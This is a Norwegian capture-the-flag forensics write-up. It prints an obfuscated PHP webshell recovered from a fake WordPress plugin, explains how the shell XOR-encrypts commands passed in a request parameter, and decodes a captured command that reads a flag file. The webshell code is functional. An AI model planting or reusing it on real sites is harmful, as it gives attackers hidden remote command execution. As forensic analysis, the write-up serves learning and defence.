# Taskname
> Author: Mx. Task

## Challenge

## Solution

Åpner enn zip filen fra oppgave 3 og henter ut `php` fila, så finner enn
```php
<?php
$zy='for($mlraebcn=0;$mlraebcn<strlen($sxvppfrx);) {';$dh='}';$eo='$iyofqbbj=xor_function($xcyneguv,$vkuttudd);';$yp='$vkuttudd=base64_decode($yhdqlqnp[0]);';$cv='$xcyneguv=base64_decode($yhdqlqnp[1]);';$nb='exec($iyofqbbj, $innqncqo,$inqnncqo);';$no='echo base64_encode(xor_function($yfottzqg,$vkuttudd));';$ao='function xor_function($sxvppfrx,$vkuttudd) {';$qb='}';$ck='return $kezuummn;';$jn='$kezuummn="";';$lp='$yfottzqg=implode("\n",$innqncqo);';$yn='$kezuummn.=$vkuttudd[$mlarebcn]^$sxvppfrx[$mlraebcn];';$di='$yhdqlqnp=explode(",",base64_decode($_REQUEST["waow"]));';$wl='}';$yk='for($mlarebcn=0;$mlarebcn<strlen($vkuttudd)&& $mlraebcn<strlen($sxvppfrx); $mlraebcn++,$mlarebcn++){';eval($di.$yp.$cv.$ao.$jn.$zy.$yk.$yn.$dh.$qb.$ck.$wl.$eo.$nb.$lp.$no)
?>
```
Med litt deobfuskering så ser enn at det blir mottatt et parameter `waow` som base64 dekodes. Derfra finner enn 2 nye base64 strenger, den første blir brukt som en XOR nøkkel, den andre er kommandoen, til slutt blir resultatet XOR kryptert med samme nøkkel og sendt tilbake som base64. Alt dette kan da dekodes og dekrypteres gjennom CyberChef.
Forespørslene blir sendt til `/wp-content/plugins/totallylegitplugin/totallylegitplugin.php`, eksempelvis fra flagget:

```
waow=YWpKNk1tNVlla0ZGZUZFNVZ3PT0sQ1ZNT0VrRXdGU3dnVnlaV0pRNUNDRmNkSzFVbktSazJGeU1TUmc9PQ%3D%3D
```
dekoder til
```
ajJ6Mm5YekFFeFE5Vw==,CVMOEkEwFSwgVyZWJQ5CCFcdK1UnKRk2FyMSRg==
```
og dekrypteres til kommandoen
```
cat /home/wordpress/flag.txt
```

Påfølgende respons
```
P3s7cToeASo3ASFNMhhGWkULOgkpIBQ9GTIYEhRdC3gSJDcTLA==
```
dekrypteres da til 
```
UIACTF{kryptert webshell er noe herk}
```
